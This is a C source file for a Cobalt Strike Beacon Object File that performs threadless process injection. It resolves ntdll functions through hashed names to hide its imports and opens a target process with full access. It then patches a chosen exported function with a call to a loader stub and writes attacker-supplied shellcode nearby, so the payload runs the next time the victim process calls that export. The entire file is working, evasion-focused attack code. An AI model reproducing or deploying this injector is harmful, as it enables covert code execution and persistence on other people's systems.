// entry.c (ThreadlessInjectBof)
#include <windows.h>
#include "beacon.h"
#include "typedefs.h"

#define HashStringNtdll 0x467f5122
#define HashStringNtOpenProcess 0xc9465091
#define HashStringNtAllocateVirtualMemory 0xf7eb76b1
#define HashStringNtProtectVirtualMemory 0xae75b471
#define HashStringNtWriteVirtualMemory 0x8513601
#define HashStringNtClose 0xa3ec3880

#define HashStringA(x) HashStringFowlerNollVoVariant1aA(x)
#define HashStringW(x) HashStringFowlerNollVoVariant1aW(x)

ULONG HashStringFowlerNollVoVariant1aA(_In_ LPCSTR String)
{
    ULONG Hash = 0x6A6CCC06;

    while (*String)
    {
        Hash ^= (UCHAR)*String++;
        Hash *= 0x25EDE3FB;
    }

    return Hash;
}
ULONG HashStringFowlerNollVoVariant1aW(_In_ LPCWSTR String)
{
    ULONG Hash = 0x6A6CCC06;

    while (*String)
    {
        Hash ^= (UCHAR)*String++;
        Hash *= 0x25EDE3FB;
    }

    return Hash;
}


HMODULE _GetModuleHandle(_In_ ULONG dllHash)
{
    PLIST_ENTRY head = (PLIST_ENTRY) & ((PPEB)__readgsqword(0x60))->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY next = head->Flink;

    PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - 16);

    while (next != head)
    {
        module = (PLDR_MODULE)((PBYTE)next - 16);
        if (module->BaseDllName.Buffer != NULL)
        {
            if (dllHash - HashStringW(module->BaseDllName.Buffer) == 0)
                return (HMODULE)module->BaseAddress;
        }
        next = next->Flink;
    }

    return NULL;
}
FARPROC _GetProcAddress(_In_ HMODULE dllBase, _In_ ULONG funcHash)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(dllBase);
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + (dos)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    if (exports->AddressOfNames != 0)
    {
        PWORD ordinals = (PWORD)((UINT_PTR)dllBase + exports->AddressOfNameOrdinals);
        PDWORD names = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfNames);
        PDWORD functions = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfFunctions);

        for (DWORD i = 0; i < exports->NumberOfNames; i++) {
            LPCSTR name = (LPCSTR)((UINT_PTR)dllBase + names[i]);
            if (HashStringA(name) == funcHash) {
                PBYTE function = (PBYTE)((UINT_PTR)dllBase + functions[ordinals[i]]);
                return (FARPROC)function;
            }
        }
    }
    return NULL;
}


void GenerateHook(UINT_PTR originalInstructions, char* shellcodeLoader)
{
    for (int i = 0; i < 8; i++) 
        shellcodeLoader[18 + i] = ((char*)&originalInstructions)[i];
}


UINT_PTR findMemoryHole(HANDLE proc, UINT_PTR exportAddr, SIZE_T size)
{
    UINT_PTR remoteLdrAddr;
    BOOL foundMem = FALSE;
    NTSTATUS status;

    typeNtAllocateVirtualMemory pNtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)_GetProcAddress(_GetModuleHandle(HashStringNtdll), 0xf7eb76b1);

    for (remoteLdrAddr = (exportAddr & 0xFFFFFFFFFFF70000) - 0x70000000;
        remoteLdrAddr < exportAddr + 0x70000000;
        remoteLdrAddr += 0x10000)
    {
        status = pNtAllocateVirtualMemory(proc, (PVOID*)&remoteLdrAddr, 0, &size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READ);
        if (status != 0)
            continue;

        foundMem = TRUE;
        break;
    }

    return foundMem ? remoteLdrAddr : 0;
}


void go(char* args, int alen) {
    // Argument parsing
    datap parser;
    SIZE_T pid;
    LPCSTR targetDllName;
    LPCSTR targetFunctionName;
    char* shellcode;
    SIZE_T shellcodeSize = 0;

    BeaconDataParse(&parser, args, alen);
    pid = BeaconDataInt(&parser);
    targetDllName = BeaconDataExtract(&parser, NULL);
    targetFunctionName = BeaconDataExtract(&parser, NULL);
    shellcode = BeaconDataExtract(&parser, &shellcodeSize);

    BeaconPrintf(CALLBACK_OUTPUT, "Injecting into target process, executing via %s!%s", targetDllName, targetFunctionName);

    char shellcodeLoader[] = {
        0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
        0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
        0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
        0xE0, 0x90 
    };
    
    // Get address of target function
    HMODULE dllBase = _GetModuleHandle(HashStringA(targetDllName));
    if (dllBase == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to locate base address of %s", targetDllName);
        return;
    }

    UINT_PTR exportAddress = (UINT_PTR)_GetProcAddress(dllBase, HashStringA(targetFunctionName));
    if (exportAddress == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to locate base address of %s!%s", targetDllName, targetFunctionName);
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "%s!%s @ 0x%llx", targetDllName, targetFunctionName, exportAddress);

    // Get base address of ntdll, used for ntapi calls.
    HMODULE ntdllBase = _GetModuleHandle(HashStringNtdll);

    // Parse required NTAPI functions
    typeNtOpenProcess pNtOpenProcess = (typeNtOpenProcess)_GetProcAddress(ntdllBase, HashStringNtOpenProcess);
    typeNtAllocateVirtualMemory pNtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)_GetProcAddress(ntdllBase, HashStringNtAllocateVirtualMemory);
    typeNtProtectVirtualMemory pNtProtectVirtualMemory = (typeNtProtectVirtualMemory)_GetProcAddress(ntdllBase, HashStringNtProtectVirtualMemory);
    typeNtWriteVirtualMemory pNtWriteVirtualMemory = (typeNtWriteVirtualMemory)_GetProcAddress(ntdllBase, HashStringNtWriteVirtualMemory);
    typeNtClose pNtClose = (typeNtClose)_GetProcAddress(ntdllBase, HashStringNtClose );
    
    if (pNtOpenProcess == 0
        || pNtAllocateVirtualMemory == 0
        || pNtProtectVirtualMemory == 0
        || pNtWriteVirtualMemory == 0
        || pNtClose == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to locate NTAPI functions from ntdll.dll");
        return;
    }

    // Get handle to target process
    HANDLE pHandle = NULL;
    CLIENT_ID ClientId;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    ClientId.UniqueProcess = (HANDLE)pid;
    ClientId.UniqueThread = NULL;

    NTSTATUS status = pNtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
    if (status != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to acquire handle to target process (pid: %d), status: 0x%llx", pid, status);
        return;
    }

    // Locate memory hole for shellcode to reside in.
    UINT_PTR loaderAddress = findMemoryHole(pHandle, exportAddress, sizeof(shellcodeLoader) + shellcodeSize);
    if (loaderAddress == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to locate memory hole within 2G of export address");
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Allocated region @ 0x%llx", loaderAddress);

    // Get original 8 bytes at export address
    UINT_PTR originalBytes = 0;
    for (int i = 0; i < 8; i++) ((BYTE*)&originalBytes)[i] = ((BYTE*)exportAddress)[i];

    // Setup the call 0x1122334455667788 in the shellcodeLoader
    GenerateHook(originalBytes, shellcodeLoader);

    // Change exportAddress memory to rwx, have to do this to stop the target process potentially crashing (IoC)
    SIZE_T regionSize = 8;
    ULONG oldProtect = 0;
    UINT_PTR targetRegion = exportAddress;
    status = pNtProtectVirtualMemory(pHandle, (PVOID*)&targetRegion, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to change page protections @ 0x%llx, status: 0x%llx", targetRegion, status);
        return;
    }

    // Calculate callOpCode & write to export
    UINT_PTR relativeLoaderAddress = loaderAddress - (exportAddress + 5);
    char callOpCode[] = { 0xe8, 0, 0, 0, 0 };
    for (int i = 0; i < 4; i++)
        callOpCode[1 + i] = ((char*)&relativeLoaderAddress)[i];
    
    ULONG bytesWritten = 0;
    targetRegion = exportAddress;
    status = pNtWriteVirtualMemory(pHandle, (PVOID)targetRegion, (PVOID)callOpCode, sizeof(callOpCode), &bytesWritten);
    if (status != 0 || bytesWritten != sizeof(callOpCode))
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to write call opcode @ 0x%llx, status: 0x%llx", exportAddress, status);
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Wrote call opcode @ 0x%llx", exportAddress);
    
    // Change loaderAddress protections to rw
    regionSize = sizeof(shellcodeLoader) + shellcodeSize;
    status = pNtProtectVirtualMemory(pHandle, (PVOID*)&loaderAddress, &regionSize, PAGE_READWRITE, &oldProtect);
    if (status != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to change page protections @ 0x%llx, status: 0x%llx", loaderAddress, status);
        return;
    }

    // Write payload to address (2 writes here because I cba to concat the two buffers)
    status = pNtWriteVirtualMemory(pHandle, (PVOID)loaderAddress, (PVOID)shellcodeLoader, sizeof(shellcodeLoader), &bytesWritten);
    if (status != 0 || bytesWritten != sizeof(shellcodeLoader))
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to write loader stub @ 0x%llx, status: 0x%llx", loaderAddress, status);
        return;
    }

    status = pNtWriteVirtualMemory(pHandle, (PVOID)(loaderAddress+sizeof(shellcodeLoader)), (PVOID)shellcode, shellcodeSize, &bytesWritten);
    if (status != 0 || bytesWritten != shellcodeSize)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to write payload @ 0x%llx, status: 0x%llx", loaderAddress + shellcodeSize, status);
        return;
    }

    // Restore original protections
    status = pNtProtectVirtualMemory(pHandle, (PVOID*)&loaderAddress, &regionSize, oldProtect, &oldProtect);
    if (status != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to change page protections @ 0x%llx, status: 0x%llx", loaderAddress, status);
        return;
    }

    BeaconOutput(CALLBACK_OUTPUT, "Injection complete. Payload will execute when the targeted process calls the export", 84);
    pNtClose( pHandle );

    return;
}